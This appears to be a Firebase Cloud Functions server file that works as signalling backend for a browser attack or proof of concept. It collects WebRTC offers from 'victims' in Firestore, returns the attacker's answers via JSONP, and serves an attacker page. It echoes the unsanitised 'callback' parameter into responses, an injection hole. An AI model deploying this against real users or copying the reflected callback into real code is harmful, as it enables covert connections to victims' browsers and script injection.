const functions = require("firebase-functions")
const admin = require("firebase-admin")
const express = require("express")
const app = express()
admin.initializeApp(functions.config().firebase)
const db = admin.firestore()

db.settings({ timestampsInSnapshots: true })

app.get("/victim-sends-offer", async (req, res) => {
    if(req.query.sdp === undefined) res.status(400).send("Missing SDP.")

    console.log(req.query.sdp)

    return await db.collection('victims').add({
        offer: JSON.parse(req.query.sdp)
    }).then( ref => {
        //res.send(ref.id)
        res.send(`${req.query.callback}("${ref.id}")`)
    })
});

app.get("/victim-receives-answer", async (req, res) => {
    if(req.query.id === undefined) res.status(400).send("Missing ID.")

    const snapshot = await db.collection('victims').doc(req.query.id).get()
    //res.send(snapshot.data().answer.sdp)
    res.send(`${req.query.callback}(${JSON.stringify(snapshot.data().answer)})`)
})

app.get("/attacker", async (req, res) => {
    return await deleteCollection(db, "victims", 1).then( () => {
        res.sendFile("attacker.html", { root: __dirname })
    })
})

app.get("/jsonp", (req, res) => {
    res.send(`${req.query.callback}("omgwtfbbq")`)
})

function deleteCollection(db, collectionPath, batchSize) {
    var collectionRef = db.collection(collectionPath);
    var query = collectionRef.orderBy('__name__').limit(batchSize);
  
    return new Promise((resolve, reject) => {
      deleteQueryBatch(db, query, batchSize, resolve, reject);
    });
  }
  
  function deleteQueryBatch(db, query, batchSize, resolve, reject) {
    query.get()
      .then((snapshot) => {
        // When there are no documents left, we are done
        if (snapshot.size == 0) {
          return 0;
        }
  
        // Delete documents in a batch
        var batch = db.batch();
        snapshot.docs.forEach((doc) => {
          batch.delete(doc.ref);
        });
  
        return batch.commit().then(() => {
          return snapshot.size;
        });
      }).then((numDeleted) => {
        if (numDeleted === 0) {
          resolve();
          return;
        }
  
        // Recurse on the next process tick, to avoid
        // exploding the stack.
        process.nextTick(() => {
          deleteQueryBatch(db, query, batchSize, resolve, reject);
        });
      })
      .catch(reject);
  }
  

exports.app = functions.https.onRequest(app)
